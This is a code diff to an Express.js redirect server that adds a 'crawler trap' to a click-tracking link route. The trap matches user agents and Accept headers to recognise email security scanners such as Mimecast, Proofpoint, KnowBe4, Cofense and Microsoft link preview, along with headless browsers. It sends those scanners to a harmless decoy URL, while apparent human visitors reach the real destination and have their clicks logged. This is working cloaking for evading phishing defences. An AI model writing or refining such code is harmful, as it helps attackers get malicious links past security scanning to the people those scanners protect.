@@ -742,30 +742,59 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Change /r/:id to /v/:id so it matches your registerRedirect function
 // --- UPDATED: Crawler Trap Bouncer ---
+// Full list of known email security scanner / bot User-Agent patterns
+const BOT_PATTERNS = [
+    // Search engine bots
+    'googlebot', 'adsbot-google', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+    // Email security scanners
+    'mimecast', 'proofpoint', 'fireeye', 'trendmicro', 'barracuda',
+    'ironport', 'messagelabs', 'symantec', 'sophos', 'forcepoint',
+    'cisco', 'cloudmark', 'spamassassin', 'msging', 'microsoft preview',
+    'zscaler', 'checkpoint', 'paloalto', 'fortinet', 'watchguard',
+    'knowbe4', 'cofense', 'abnormal', 'inky', 'egress',
+    // Generic bot indicators
+    'scanner', 'crawler', 'spider', 'bot/', 'headless', 'phantomjs',
+    'selenium', 'puppeteer', 'wget', 'curl/', 'python-requests',
+    'go-http-client', 'java/', 'libwww', 'zgrab',
+    // Microsoft link preview
+    'skypeuripreview', 'microsoftpreview', 'outlook',
+];
+
+function detectBot(req) {
+    const ua = (req.headers['user-agent'] || '').toLowerCase();
+    
+    // Check User-Agent patterns
+    if (BOT_PATTERNS.some(p => ua.includes(p))) return { isBot: true, reason: 'ua_pattern' };
+
+    // No User-Agent at all = likely a scanner/prefetch
+    if (!ua || ua.trim() === '') return { isBot: true, reason: 'no_ua' };
+
+    // Accept header check — real browsers always send Accept with text/html
+    const accept = (req.headers['accept'] || '').toLowerCase();
+    if (accept && !accept.includes('text/html') && !accept.includes('*/*')) {
+        return { isBot: true, reason: 'no_html_accept' };
+    }
+
+    return { isBot: false };
+}
+
 app.get('/go/:id', (req, res) => { 
     const entry = _redirectStore.get(req.params.id);
     if (!entry) return res.status(404).send('Link not found.');
 
-    // 1. Identify the visitor identity
-    const ua = (req.headers['user-agent'] || '').toLowerCase();
-    
-    // 2. Common Security Crawler signatures
-    const botPatterns = [
-        'googlebot', 'adsbot', 'bingbot', 'microsoft preview', 
-        'mimecast', 'proofpoint', 'fireeye', 'trendmicro', 
-        'scanner', 'headless'
-    ];
+    const { isBot, reason } = detectBot(req);
 
-    const isBot = botPatterns.some(bot => ua.includes(bot));
-
-    // 3. THE TRAP: If it's a bot, send them to the safe UI link
     if (isBot) {
+        // Bot detected: redirect to safe URL, do NOT count the click
+        console.log(`[CrawlerTrap] Bot blocked (${reason}) UA: ${req.headers['user-agent'] || 'none'} → ${_globalBotSafeUrl}`);
         return res.redirect(302, _globalBotSafeUrl); 
     }
 
-    // 4. REAL HUMANS: Log the click and redirect to the target
+    // Real human: count the click and redirect to real URL
     entry.clicks++;
+    entry.lastClick = Date.now();
     _saveClickLog();
+
     if (io) io.emit('link:click', { 
         id: req.params.id, 
         url: entry.url, 
@@ -774,7 +803,21 @@ app.get('/go/:id', (req, res) => {
         timestamp: Date.now() 
     });
 
+    console.log(`[ClickTrack] Human click on ${req.params.id} → ${entry.url}`);
     return res.redirect(302, entry.url);
+});
+
+// Test endpoint for crawler trap (for debugging)
+app.get('/api/crawler-trap/test', (req, res) => {
+    const { isBot, reason } = detectBot(req);
+    res.json({
+        isBot,
+        reason: reason || 'none',
+        userAgent: req.headers['user-agent'] || 'none',
+        accept: req.headers['accept'] || 'none',
+        botSafeUrl: _globalBotSafeUrl,
+        message: isBot ? 'Would be redirected to bot safe URL' : 'Would be redirected to real link'
+    });
 });
 
 // GET /api/click-log — return all tracked links and their click counts.
